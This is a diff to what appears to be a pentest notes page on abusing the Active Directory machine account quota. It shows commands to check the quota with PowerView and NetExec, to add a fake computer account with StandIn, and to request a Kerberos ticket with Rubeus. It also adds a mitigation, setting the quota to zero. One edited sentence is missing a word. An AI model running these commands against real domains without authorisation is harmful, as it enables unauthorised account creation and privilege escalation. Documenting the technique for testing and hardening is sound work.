@@ -27,14 +27,17 @@ By default, any domain user can add up to 10 computers into the domain they belo
 
 ## Exploit
 
-The attribute `ms-DS-MachineAccountQuota` is generally set at the root level of the domain. To check its value, use following command.
+The attribute `ms-DS-MachineAccountQuota` is generally set at the root level of the domain. To check its value, use one of the following commands.
 
 ```powershell
 # Replace with the appropriate Dinstinguished Name.
 Get-DomainObject -Identity "DC=$sub,DC=$company,DC=$com" -Properties ms-DS-MachineAccountQuota
+
+# Using NetExec.
+nxc ldap -d $Domain -u $Username -p $Password -M maq
 ```
 
-If you can join fake computer to the domain, use [StandIn](https://github.com/FuzzySecurity/StandIn) to do it.
+If you can a new computer account to the domain, use [StandIn](https://github.com/FuzzySecurity/StandIn) to do it.
 
 ```powershell
 # Generate the fake computer and add it to the domain.
@@ -46,3 +49,7 @@ If you can join fake computer to the domain, use [StandIn](https://github.com/Fu
 # Ask a TGT for it.
 ./Rubeus.exe asktgt /user:$ComputerName$ /aes256:$hash /nowrap
 ```
+
+## Recommendations
+
+- [ ] Set `ms-DS-MachineAccountQuota` to `0` for all domain users if possible, or at least for unprivileged users.
